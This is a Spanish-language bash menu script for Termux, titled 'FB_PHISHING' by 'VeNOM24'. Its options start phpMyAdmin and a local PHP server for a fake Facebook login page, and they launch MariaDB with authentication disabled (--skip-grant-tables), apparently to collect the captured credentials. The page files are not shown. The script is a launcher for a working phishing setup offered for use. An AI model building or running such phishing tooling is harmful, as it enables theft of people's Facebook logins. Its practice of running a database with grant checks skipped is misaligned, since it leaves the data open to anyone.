#! data/data/com.termux/files/usr/bin/bash
clear
#variables
                red='\033[1;31m'
                green='\033[1;32m'
                yellow='\033[1;33m'
                blue='\033[1;34m'
                magenta='\033[1;35m'
                cyan='\033[1;36m'
                reset='\033[0m'	                     
banner() {
printf $cyan
echo      "
 ░█▀▀░█▀▄░░░░░█▀█░█░█░▀█▀░█▀▀░█░█░▀█▀░█▀█░█▀▀
 ░█▀▀░█▀▄░░░░░█▀▀░█▀█░░█░░▀▀█░█▀█░░█░░█░█░█░█
 ░▀░░░▀▀░░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀▀"
echo
printf $reset
echo -e   "\e[1;34m  AUTHOR:\033[1;31m VeNOM24"
echo -e   "\e[1;34m  TOOL:\033[1;31m   FB_PHISHING"
echo -e   "\e[1;34m  VERSION:\033[1;31m1.0"

echo -e "\e[1;36m =============================================
\033[1;36m ============================================="
echo ""
echo -e "\033[1;34m  [\033[0;m01\033[1;34m]\033[1;31m PHPMYADMIN \033[1;32mPUERTO 4545"
echo -e "\033[1;34m  [\033[0;m02\033[1;34m]\033[1;31m FB_LOGIN \033[1;32m  PUERTO 8080"
echo -e "\033[1;34m  [\033[0;m03\033[1;34m]\033[1;31m MARIADB  \033[1;32m  PUERTO 3036"
echo -e "\033[1;34m  [\033[0;m00\033[1;34m]\033[1;31m EXIT"    
echo
}

err() {                                              echo -e " \033[1;31m Error opcion invaalida"         
seleccion                                           
}
echo
seleccion(){
cd ~/FB_phishing	
#echo -e "\e[1;36m"                                  
echo -e -n "\e[1;36m  SELECT YOUR OPTION #>> ";
printf $reset
read OPCION;

case $OPCION in

01)
cd 
cd $PREFIX/share/phpmyadmin

php -S localhost:4545
	
;;
02)
php -S localhost:8080

;;

03)
	mysqld --skip-grant-tables --general-log &

	;;
00)
	exit
	;;
*) err;;	
esac    
}       
banner
seleccion
